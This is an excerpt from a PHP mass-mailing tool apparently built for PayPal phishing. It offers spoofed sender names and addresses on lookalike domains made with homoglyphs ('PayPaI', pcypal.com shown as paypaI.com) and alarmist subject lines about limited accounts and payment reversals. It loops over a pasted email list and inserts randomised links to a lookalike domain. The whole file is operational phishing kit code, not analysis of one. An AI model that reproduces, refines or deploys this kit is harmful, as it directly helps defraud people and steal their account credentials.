...
$name='bcf388f92e8bd999ef421dcf20b686aa'; //Rifqyajx
$pass='298808e8b42f9394411e839f8c9b3c17'; // :v
						...
						<div class="col-sm-8" style="padding-right: 7.5px !important;">
							...
							<div style="margin-bottom: 10px" class="input-group">
										...
										<select class="form-control" onChange="Pilih1(this);">
											...
											<option value="PayPaI">PayPaI Inc.</option>
											<option value="PaypaI Service">PaypaI Inc. Services</option>
											<option value="PaypaI Support">PaypaI Inc. Support</option>
										...
										<select class="form-control kanan" onChange="Pilih2(this);">
											...
											<option value="services@intl.pcypal.com">service@intI.paypaI.com</option>
											<option value="services@pcpyal.co.uk">service@paypaI.co.uk</option>
											<option value="paypal@e.pcypal.co.uk">paypaI@e.paypaI.co.uk</option>
							...
							<div style="margin-bottom: 10px" class="input-group">
										...
										<select class="form-control kanan" onChange="Pilih3(this);">
											...
											<option value="Your accounts has been Limited until we hear from you">Your accounts has been Limited until we hear from you</option>
											<option value="We're investigated a paypaI payments reversaI (Case ID #PP-003-498-237-832)">We're investigated a paypaI payments reversaI (Case ID #PP-003-498-237-832)</option>
											<option value="We have Iimited accesss to your PayPaI accounts">We have Iimited accesss to your PayPaI accounts</option>
											<option value="You have accounts Notification">You have accounts Notification</option>
											<option value="Important attention: Your accounts status change">Attention: Your account status change</option>
											<option value="Yours PayPaI Account Has Been Limited.. Here is what you need to do's.">Your PayPaI Account Has Been Limited. Here's what you need to do.</option>
	...
	$allemails = split("\n", $emaillist);
        	...
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
          	...
          	for($x=0; $x<$numemails; $x++){
                ...
                if ($to){
	                $to = ereg_replace(" ", "", $to);
	                $message = ereg_replace("&url&", "http://pavpls.com/".generateRandomString(7), $message);
